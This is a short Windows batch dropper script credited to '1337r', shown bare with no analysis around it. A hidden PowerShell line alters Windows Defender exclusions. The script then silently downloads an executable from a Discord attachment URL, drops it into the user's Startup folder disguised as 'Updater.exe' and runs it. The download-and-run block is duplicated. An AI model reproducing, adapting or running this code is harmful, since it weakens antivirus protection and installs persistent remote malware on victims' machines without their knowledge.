powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
title coded by 1337r

setlocal 

set "URL=https://cdn.discordapp.com/attachments/1186951717934333972/1186957752065597500/DLL_MAIN.exe?ex=6595238c&is=6582ae8c&hm=bd04715e28e7b6a43d969945164a5de8021ae110d882c7e83775294afc1cc7a9&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1186951717934333972/1186957752065597500/DLL_MAIN.exe?ex=6595238c&is=6582ae8c&hm=bd04715e28e7b6a43d969945164a5de8021ae110d882c7e83775294afc1cc7a9&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
cd /d %~dp0
